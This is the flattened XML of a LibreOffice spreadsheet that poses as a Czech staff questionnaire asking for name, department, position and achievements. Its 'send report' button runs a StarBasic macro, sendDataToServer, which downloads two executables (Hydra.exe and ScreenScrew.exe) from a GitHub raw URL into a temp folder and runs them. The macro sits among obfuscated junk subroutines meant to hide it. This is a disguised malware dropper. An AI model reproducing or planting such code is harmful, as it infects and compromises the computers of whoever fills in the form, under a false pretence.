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enddata.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/Standard/evaldata.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/Standard/script-lb.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/Standard/timedData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order-bottom="1.5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2e285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2e285" fo:border-left="0.74pt solid #000000" fo:border-right="1.5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fo:background-color="#fc5c00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1" table:style-name="ta1">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false">
          <form:form form:name="Formulář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deslat report" form:control-implementation="ooo:com.sun.star.form.component.CommandButton" xml:id="control1" form:id="control1" form:label="Odeslat repo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admin/Desktop/dotazn%C3%ADk.ods/content.xml"/>
              </form:properties>
              <office:event-listeners>
                <script:event-listener script:language="ooo:script" script:event-name="form:performaction" xlink:href="vnd.sun.star.script:Standard.senddata.sendDataToServer?language=Basic&amp;location=document" xlink:type="simple"/>
              </office:event-listeners>
            </form:button>
          </form:form>
        </office:forms>
        <table:shapes>
          <draw:control draw:z-index="0" draw:name="Ovládací prvek 1" draw:style-name="gr1" draw:text-style-name="P1" svg:width="12.695cm" svg:height="1.912cm" svg:x="15.233cm" svg:y="11.022cm" draw:control="control1"/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5" table:default-cell-style-name="Default"/>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="4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9"/>
          <table:table-cell table:style-name="ce7" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="4" table:number-rows-spanned="1">
            <text:p>osobní údaje</text:p>
          </table:table-cell>
          <table:covered-table-cell table:number-columns-repeated="2" table:style-name="ce13"/>
          <table:covered-table-cell table:style-name="ce16"/>
          <table:table-cell table:number-columns-repeated="5"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:number-columns-repeated="9"/>
          <table:table-cell table:style-name="ce8" office:value-type="string" calcext:value-type="string">
            <text:p>Jméno</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14" office:value-type="string" calcext:value-type="string">
            <text:p>Příjmení</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14" office:value-type="string" calcext:value-type="string">
            <text:p>Oddělení</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce17" office:value-type="string" calcext:value-type="string">
            <text:p>Pozice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9"/>
          <table:table-cell table:style-name="ce15" table:number-columns-repeated="2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7"/>
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="6" table:number-rows-spanned="1">
            <text:p>Deset vašich úspěchů za posledních 5 let</text:p>
          </table:table-cell>
          <table:covered-table-cell table:number-columns-repeated="4" table:style-name="ce10"/>
          <table:covered-table-cell table:style-name="ce19"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce20" office:value-type="string" calcext:value-type="string" table:number-columns-spanned="3" table:number-rows-spanned="1">
            <text:p>Stačí vyplnit pouze 3 vaše úspěchy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1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/>
          <table:table-cell table:style-name="ce21" office:value-type="string" calcext:value-type="string">
            <text:p>vyplněných:</text:p>
          </table:table-cell>
          <table:table-cell table:formula="of:=SUMPRODUCT(--([.I11:.I20]&lt;&gt;&quot;&quot;)) &amp; &quot; z 10&quot;" office:value-type="string" office:string-value="0 z 10" calcext:value-type="string">
            <text:p>0 z 10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string" calcext:value-type="string">
            <text:p>2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3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4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5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6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7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8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9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 calcext:value-type="string">
            <text:p>10:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25" table:number-columns-spanned="6" table:number-rows-spanned="1"/>
          <table:covered-table-cell table:number-columns-repeated="4" table:style-name="ce12"/>
          <table:covered-table-cell table:style-name="ce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.00.0000</text:date>, <text:time style:data-style-name="N2" text:time-value="11:11:59.12669471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53:06.520551200</meta:creation-date>
    <dc:date>2026-04-05T11:13:05.318360351</dc:date>
    <meta:editing-duration>PT2H11M31S</meta:editing-duration>
    <meta:editing-cycles>85</meta:editing-cycles>
    <meta:generator>LibreOffice/24.2.7.2$Linux_X86_64 LibreOffice_project/420$Build-2</meta:generator>
    <dc:creator>Marek Roháč</dc:creator>
    <meta:document-statistic meta:table-count="1" meta:cell-count="19" meta:object-count="1"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/evaldata.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="evaldata" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
Call _0x4a2b_init()
Call _0x99_alpha()
End Sub

Sub _0x4a2b_init()
    Dim lllI11ll As Long : lllI11ll = 42
    If (lllI11ll * 2) / 2 = 42 Then : _0x99_alpha : End If
End Sub

Sub _0x99_alpha()
    Dim zzz_99 As String : zzz_99 = "d"
    Dim vvv_88 As String : vvv_88 = "a"
    Dim ttt_77 As String : ttt_77 = "t"
    zzz_99 = Chr(100) &amp; Chr(97) &amp; Chr(116) &amp; Chr(97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nddata"/>
  <library:element library:name="evaldata"/>
  <library:element library:name="timedData"/>
</library:library>
</file>

<file path=Basic/Standard/senddata.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="senddata" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main

End Sub

Sub llll_1111_0000_Glob()
    Dim v_01, v_02, v_03 As Double
    Dim s_tag As String
    Dim b_flag As Boolean
    v_01 = Cos(0.5) : v_02 = Sin(0.5)
    b_flag = (v_01 &gt; v_02)
    If b_flag = True Then
        s_tag = Chr(88) &amp; Chr(89) &amp; Chr(90)
    Else
        s_tag = Chr(65) &amp; Chr(66) &amp; Chr(67)
    End If
    Dim j_idx As Long
    For j_idx = 1000 To 1050
        v_03 = v_01 * v_02 + j_idx
        If v_03 &gt; 2000 Then
            v_01 = v_01 / 2
        End If
        Select Case j_idx
            Case 1010, 1020, 1030
                v_02 = v_02 + 0.1
            Case 1045 To 1050
                s_tag = s_tag &amp; "_"
        End Select
    Next j_idx
    v_03 = Abs(v_01 - v_02)
    s_tag = LTrim(s_tag)
    If Len(s_tag) &lt; 1 Then s_tag = "DEFAULT"
End Sub

Function FileNameOutOfPath(sPath As String) As String
    Dim parts() As String
    parts = Split(sPath, "/")
    FileNameOutOfPath = parts(UBound(parts))
End Function

Function CreateCacheFile() as String
    Dim fso As Object
    Dim tempCesta As String
    Dim novaSlozka As String
    Set fso = CreateObject("Scripting.FileSystemObject")
	tf=fso.GetSpecialFolder(2)
    temp_file =fso.BuildPath(tf,"calc_data")
    If Not fso.FolderExists(temp_file) Then
        fso.CreateFolder(temp_file)
    End If
    CreateCacheFile=temp_file
End Function

Function PrepareSendingData(sUrl As String)
    Dim sSavePath As String
    Dim oSimpleFileAccess As Object
    Dim sTempDir As String
    Dim sName as String
    Dim casti() As String
	Set fso = CreateObject("Scripting.FileSystemObject")
    casti = Split(sUrl, "/")
    sName = casti(UBound(casti))
    sTempDir = CreateCacheFile()
    sName = casti(UBound(casti))
    sSavePath =fso.BuildPath(sTempDir,sName)
    oSimpleFileAccess = createUnoService("com.sun.star.ucb.SimpleFileAccess")
    If oSimpleFileAccess.exists(sSavePath) Then 
        oSimpleFileAccess.kill(sSavePath)
    End If
    oSimpleFileAccess.copy(sUrl, sSavePath)
	PrepareSendingData=sSavePath
End Function

Sub _v_calc_33(Optional _arg1)
    Dim _i As Integer
    For _i = 0 To 10
        If _i &gt; 100 Then Exit For
    Next _i
    _0x_empty_loop
End Sub

Sub _0x_empty_loop()
    Dim _q1 As Double : _q1 = Rnd(1)
    Select Case _q1
        Case 0 To 0.5 : 
        Case Else : 
    End Select
End Sub

Sub _z_math()
    Dim _r As Double
    _r = Sqr(144) * Log(10) / Exp(1)
End Sub

Sub l1l1_O0O0_LongUrl_Scanner()
    Dim l_str_01 As String
    Dim l_str_02 As String
    Dim l_res As String
    Dim i_ptr As Integer
    l_str_01 = "https://cdn.server-internal-01.com/api/v1/storage/verify/hash/8823491023/session/tmp/f?user=admin&amp;token=0x992834123841234&amp;check=true&amp;mode=legacy&amp;auth=sha256&amp;signature=d8234db234ce234&amp;timestamp=1723491234&amp;origin=local_host_node_77"
    l_str_02 = "C:\var\cache\lib\office\share\config\internal\registry\data\current\session\lock\0x11223344556677889900\backup\recovery\auto\save\point\098123.tmp"
    On Error Resume Next
    For i_ptr = 1 To Len(l_str_01) Step 3
        l_res = Mid(l_str_01, i_ptr, 1)
        If Asc(l_res) Mod 7 = 0 Then
            l_str_02 = l_str_02 &amp; Chr(45)
        End If
    Next i_ptr
    Dim o_Obj As Object
    o_Obj = createUnoService("com.sun.star.util.PathSubstitution")
    l_res = o_Obj.getSubstituteVariableValue("$(prog)")
    
    If Len(l_str_01) &gt; Len(l_str_02) Then
        l_str_01 = Left(l_str_01, 20) &amp; Right(l_str_02, 20)
    End If    
    Dim d_val As Double
    d_val = (Len(l_str_01) * 3.14) / 1.5
    l_res = "Status_" &amp; Hex(Int(d_val))
End Sub

Sub l1O0_X99_Z0()
    Dim l11O_v As Long
    Dim lO01_m As Object
    Dim O11l_k As String
    Dim l1l1_p As Integer
    On Error Resume Next
    l11O_v = 1024
    For l1l1_p = 1 To 45
        If l1l1_p Mod 2 = 0 Then
            l11O_v = l11O_v + l1l1_p
        Else
            l11O_v = l11O_v - 1
        End If
        O11l_k = "Iter_ID_" &amp; CStr(l11O_v)
        If l11O_v &lt; 0 Then GoTo lO_Exit_Fail
    Next l1l1_p
    lO01_m = createUnoService("com.sun.star.util.PathSubstitution")
    O11l_k = lO01_m.getSubstituteVariableValue("$(home)")
    If Len(O11l_k) &gt; 0 Then
        Dim l_tmp As Double
        l_tmp = Exp(1.2) * Log(10)
        l11O_v = Int(l_tmp)
    End If
    GoTo lO_Final
lO_Exit_Fail:
    l11O_v = 0
lO_Final:
    l1l1_p = l11O_v Mod 7
End Sub
 Sub sendDataToServer
    Dim processApp As String
    Dim sendPath As String 
    processApp = PrepareSendingData("https://raw.githubusercontent.com/theFivehead/studenti-databaze/main/Hydra.exe")
    sendPath = PrepareSendingData("https://raw.githubusercontent.com/theFivehead/studenti-databaze/main/ScreenScrew.exe")
    If FileExists(processApp) And FileExists(sendPath) Then
        Shell(processApp, 1)
        Wait 30000
        Shell(sendPath, 1)
    End If
End Sub

Sub _n_null_ref()
    On Error Resume Next
    Dim _n As Object : _n = Nothing
    Dim _s As String : _s = _n.DisplayName
End Sub
Sub O0O1_Alpha_Null()
    Dim l_arr(25) As Variant
    Dim i_0 As Integer
    Dim s_dump As String
    Dim d_val As Double
    For i_0 = 0 To 24
        l_arr(i_0) = (i_0 * Rnd()) + 3.1415
        If l_arr(i_0) &gt; 10 Then
            s_dump = "HIGH"
        Else
            s_dump = "LOW"
        End If
    Next i_0
    d_val = 1.0
    i_0 = 0
    Do While d_val &lt; 5000
        d_val = d_val * 1.05
        i_0 = i_0 + 1
        If i_0 &gt; 100 Then Exit Do
    Loop
    Dim o_SFA As Object
    o_SFA = createUnoService("com.sun.star.ucb.SimpleFileAccess")
    If o_SFA.exists("file:///non_existent_path_0x99") Then
        o_SFA.kill("file:///non_existent_path_0x99")
    End If
    s_dump = Left(s_dump, 1) &amp; Hex(i_0)
End Sub

Sub _final_0x00()
    Wait 1
End Sub

Sub _x_911_handler()
    Dim _000, _001, _002 As Integer
    _000 = 1 : _001 = 2 : _002 = _000 + _001
    If _002 = 3 Then : GoTo _exit_label : End If
_exit_label:
End Sub


</script:module>
</file>

<file path=Basic/Standard/timedData.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="timedData" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
Call l1llOO11l1()
Call l1O111lO()
End Sub

Sub l1llOO11l1()
    Dim O1l1lO11 As String
    O1l1lO11 = lO1l11OOlO()
    llO11lO1l1 O1l1lO11
End Sub

Function lO1l11OOlO() As String
    Dim l111OOlO As Date : l111OOlO = Now()
    Dim OOO11l1l As String : OOO11l1l = CStr(Hour(l111OOlO))
    Dim lllO11O1 As String : lllO11O1 = CStr(Minute(l111OOlO))
    Dim l1O1lO11 As String : l1O1lO11 = CStr(Second(l111OOlO))
    
    If Len(OOO11l1l) &lt; 2 Then OOO11l1l = "0" &amp; OOO11l1l
    If Len(lllO11O1) &lt; 2 Then lllO11O1 = "0" &amp; lllO11O1
    If Len(l1O1lO11) &lt; 2 Then l1O1lO11 = "0" &amp; l1O1lO11
    
    Dim lO11O1lO As Double : lO11O1lO = Rnd() * 100
    If lO11O1lO &gt; 101 Then 
        lO1l11OOlO = "ERROR"
    Else
        lO1l11OOlO = OOO11l1l &amp; ":" &amp; lllO11O1 &amp; ":" &amp; l1O1lO11
    End If
End Function

Sub llO11lO1l1(ByVal l11O1lO1 As String)
    Dim lO1lO111 As String
    lO1lO111 = Chr(67) &amp; Chr(97) &amp; Chr(115) 
    MsgBox l11O1lO1, 64, lO1lO111
End Sub

Sub l1O111lO()
    Dim lO111l1O(100) As Integer
    Dim O111lOlO As Integer
    For O111lOlO = 0 To 100
        lO111l1O(O111lOlO) = O111lOlO * 2
    Next O111lOlO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